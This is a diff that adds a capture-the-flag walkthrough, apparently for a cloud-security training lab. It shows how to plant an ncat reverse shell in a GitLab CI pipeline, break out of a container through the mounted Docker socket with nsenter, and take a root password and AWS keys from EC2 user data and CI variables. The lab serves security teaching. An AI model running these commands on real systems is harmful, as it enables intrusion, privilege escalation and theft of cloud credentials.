@@ -94,7 +94,7 @@ The best place to get started is probably the company GitLab server at http://<t
 
 ## The Objective
 
-Gain access to the terraform_admin_user through whatever means necessary (Note that this role has no permissions. It is simply the goal).
+Gain access to the `terraform_admin_user` through whatever means necessary (Note that this role has no permissions. It is simply the goal).
 
 ## Walkthrough
 
@@ -152,6 +152,177 @@ The following is a step by step walkthrough of the CTF. You can refer to this if
     **Getting Started**
 
     After waiting those 10 minutes, you finally have a target. You can navigate to the target_ip to see a GitLab instance. Log in using your player username and password.
+
+    ![Login Page](/images/aws/capture_the_flag/cicdont/login.png)
+
+    From here, you can navigate around, explore the various projects, and more. You might even notice a little notification in the upper right hand corner.
+
+    ![ToDo](/images/aws/capture_the_flag/cicdont/todo.png)
+
+    Ashley has some work for us! Perhaps this will give us a hint for something we can exploit.
+
+    Navigate to the mvp-docker project's Issues page.
+
+    ![Issue](/images/aws/capture_the_flag/cicdont/issue.png)
+
+    This is interesting for a few reasons. Most notably, Ashley wants some help with building a Docker container as a part of the CI/CD pipeline. She also mentions a [gitlab-ci.yml](https://docs.gitlab.com/ee/ci/yaml/gitlab_ci_yaml.html) file, which is the configuration for the [GitLab CI/CD](https://docs.gitlab.com/ee/ci/) pipeline.
+
+    Building Docker images as a part of a CI/CD pipeline can have serious security implications and this is definitely worth looking into.
+
+    Before we can get to that fun, let's take a look at that gitlab-ci.yml file. Navigate there and make some changes (you can edit the file through the web browser if you prefer or you can clone the project locally).
+
+    ![Config](/images/aws/capture_the_flag/cicdont/config.png)
+
+    After committing changes (via the web interface or otherwise) you can navigate to the `CI/CD` tab on the left to see the pipeline execute.
+
+    Clicking on the status, and then the build job we can see the output.
+
+    ![Pipeline Output](/images/aws/capture_the_flag/cicdont/buildoutput.png)
+
+    This can tell us a few things that are very useful to us as attackers. First, on line 3, we see that the CI/CD pipeline is using the "docker" executor, meaning everything executes inside a Docker container somewhere. On line 6, we see that it is using an Ubuntu Docker image. And lines 20+ show us that our input is executing in this environment.
+
+    This looks like a fantastic place to start.
+
+    **Getting a Reverse Shell**
+
+    Our next step will be to get a shell in this environment. This is where our attackbox can come in.
+
+    **Please note**: You are welcome to use your C2 platform of choice. For this walkthrough I will use netcat for simplicity.
+
+    SSH into your attack box and install a tool called `ncat`.
+
+    ![ncat install](/images/aws/capture_the_flag/cicdont/ncat.png)
+
+    Now, we can setup a listener (from the attackbox) with the following command.
+
+    ```
+    sudo ncat -l 443 --ssl -v
+    ```
+
+    We can now go back and edit the gitlab-ci.yml file to send a reverse shell. Using Ncat it's as easy as adding the following lines. From our previous foray we know this is an Ubuntu Docker container, and thus, we can use the [apt](https://en.wikipedia.org/wiki/APT_(software)) package manager.
+
+    ```
+    apt update
+    apt install -y ncat
+    ncat <attackbox_ip> 443 --ssl -e /bin/bash -v
+    ```
+
+    ![Second Pipeline](/images/aws/capture_the_flag/cicdont/newbuild.png)
+
+    Now click "Commit changes" and watch that pipeline run.
+
+    You are now the proud owner of a reverse shell inside this Docker container.
+
+    ![Shell](/images/aws/capture_the_flag/cicdont/shell.png)
+
+    **Docker Socket**
+
+    From here, there are a number of things we could try to do. Your first instinct may be, "I'm on an EC2 instance, can I reach the metadata service?". That's a great idea! Unfortunately you can't.
+
+    The bright folks over at SoftHouseIO use [IMDSv2](https://hackingthe.cloud/aws/general-knowledge/intro_metadata_service/#imdsv2), one of the benefits of which is that Docker containers cannot reach it by default.
+
+    ```
+    TTL of 1: The default configuration of IMDSv2 is to set the Time To Live (TTL) of the TCP packet containing the session token to "1". This ensures that misconfigured network appliances (firewalls, NAT devices, routers, etc.) will not forward the packet on. This also means that Docker containers using the default networking configuration (bridge mode) will not be able to reach the instance metadata service.
+    ```
+
+    That's a bummer. Other options? Try and pivot off this machine to something else in the VPC? Access a service exposed internally to the host (172.17.0.1)? Escape the container?
+
+    That last one might get us somewhere. Ashley mentioned having some issues about building a Docker container in the pipeline. To do that, wouldn't they have to use something like [kaniko](https://cloud.google.com/blog/products/containers-kubernetes/introducing-kaniko-build-container-images-in-kubernetes-and-google-container-builder-even-without-root-access)? What if they just exposed the Docker socket instead?
+
+    When a Docker socket is exposed inside a container, it can have dangerous consequences as an attacker can potentially escape the container and escalate privileges on the host.
+
+    The common location for the socket is at `/var/run/docker.sock`, let's go look for it.
+
+    ![Finding the Docker Socket](/images/aws/capture_the_flag/cicdont/socket.png)
+
+    There we go! They did mount the Docker socket! Let's use this to escape the container.
+
+    **Escaping the Container**
+
+    Note: There are many different ways you could abuse this to escape the container. I will walk through what I think is the simplest.
+
+    First let's install two tools that will make things easier for ourselves.
+
+    ```
+    apt update
+    apt install -y python3 docker.io
+    ```
+
+    Python3 will help us to spawn a `tty` and having the Docker binary will make it easier to interact with the Docker socket. We could alternatively use curl.
+
+    With those two tools installed, let's spawn a `tty` with the classic Python [one-liner](https://netsec.ws/?p=337).
+
+
+    ```
+    python3 -c "import pty;pty.spawn('/bin/bash')"
+    ```
+
+    ![Creating a TTY](/images/aws/capture_the_flag/cicdont/view.png)
+
+    Doesn't that looks so much better? We have an actual shell prompt now. This will be useful for interacting with the Docker socket. Speaking of which, let's see which Docker containers are running on the host.
+
+    ```
+    docker ps
+    ```
+
+    This output lets us know that everything is working as intended. With access to the Docker socket, let's escape by creating a privileged Docker container (Note: There are a [number of options](https://book.hacktricks.xyz/linux-unix/privilege-escalation/docker-breakout/docker-breakout-privilege-escalation) to do this).
+
+    ```
+    docker run -it --rm --pid=host --privileged ubuntu bash
+    ```
+
+    Now, inside our new privileged container, let's migrate to the namespace of a process running on the host.
+
+    ```
+    nsenter --target 1 --mount --uts --ipc --net --pid -- bash
+    ```
+
+    ![Escalating to Root](/images/aws/capture_the_flag/cicdont/rootonbox.png)
+
+    How fun is that?! We now have root on the underlying host and have escaped the container.
+
+    **Escalating**
+
+    With root on the host, we have a number of options for next steps. We can steal IAM credentials from the [metadata service](https://hackingthe.cloud/aws/general-knowledge/intro_metadata_service/), [brute force](https://hackingthe.cloud/aws/enumeration/brute_force_iam_permissions/) our IAM permissions, [enumerate roles](https://hackingthe.cloud/aws/enumeration/enum_iam_user_role/) in the account to find out what services are running in the account, attempt to [escalate IAM privileges](https://hackingthe.cloud/aws/exploitation/iam_privilege_escalation/), maybe try to [intercept the SSM agent](https://hackingthe.cloud/aws/post_exploitation/intercept_ssm_communications/) if it's running on the box? One place we should check before doing all that is the [user data](https://hackingthe.cloud/aws/general-knowledge/introduction_user_data/).
+
+    User data is used to run commands when an EC2 instance is first started or after it is rebooted (with the right configuration). This can be very helpful to determine what software is installed on the machine, and it can also potentially be a source of credentials from developers who aren't very careful.
+
+    Let's check this (remember we are using IMDSv2).
+
+    ```
+    TOKEN=`curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"`
+    curl -H "X-aws-ec2-metadata-token: $TOKEN" -v http://169.254.169.254/latest/user-data/
+    ```
+
+    ![Showing User Data](/images/aws/capture_the_flag/cicdont/userdata.png)
+
+    On first glance it appears pretty standard; It installs GitLab, installs the GitLab runners, activates them, etc.
+
+    There is a slight problem though, on the line where they installed GitLab, they accidentally leaked a credential. An important one at that. That is the credential to the root user.
+
+    This is bad news for SoftHouseIO and great news for us. Let's use this to log into the GitLab web UI as an administrator (username: root, password: <what's in the useradata>)
+
+    After exploring around for a little while, you may stumble into the the `infra-deployer` project. That sounds important.
+
+    ![The infra-deployer Project](/images/aws/capture_the_flag/cicdont/deployer.png)
+
+    "IAM Credentials are being stored in environment variables to be used with the GitLab runners". That sounds.....very interesting. The good news is that as an administrator, we can see those variables. Navigate to the `Settings` tab on the left and then click `CI/CD`. Next, click `Expand` on the `Variables` section.
+
+    ![Showing the Environment Variables](/images/aws/capture_the_flag/cicdont/variables.png)
+
+    An Access Key and a Secret Access Key! Let's see who they belong to (you can also do this [without logging to CloudTrail](https://hackingthe.cloud/aws/enumeration/whoami/) if you were so inclined).
+
+    ```
+    export AWS_ACCESS_KEY_ID=AKIA....
+    export AWS_SECRET_ACCESS_KEY=....
+    aws sts get-caller-identity
+    ```
+
+    ![Whoami](/images/aws/capture_the_flag/cicdont/identity.png)
+
+    And with that we have achieved our objective! Congratulations on completing the CTF. Want to provide some feedback? Feel free to open a discussion on [GitHub](https://github.com/Hacking-the-Cloud/hackingthe.cloud/discussions/categories/ctf-discussion).
+
+
 
 
 ## Acknowledgements
